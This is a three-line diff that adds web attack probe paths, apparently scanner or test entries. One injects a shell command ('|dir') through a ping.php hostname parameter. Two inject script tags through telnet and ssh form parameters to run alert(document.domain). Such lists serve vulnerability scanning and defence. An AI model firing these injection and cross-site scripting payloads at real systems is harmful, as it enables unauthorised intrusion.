@@ -1,0 +1,3 @@
+/php/ping.php?hostname=|dir
+/php/telnet_form.php?hostname=%3C%2Ftitle%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Ctitle%3E
+/php/ssh_form.php?hostname=%3C/title%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Ctitle%3E
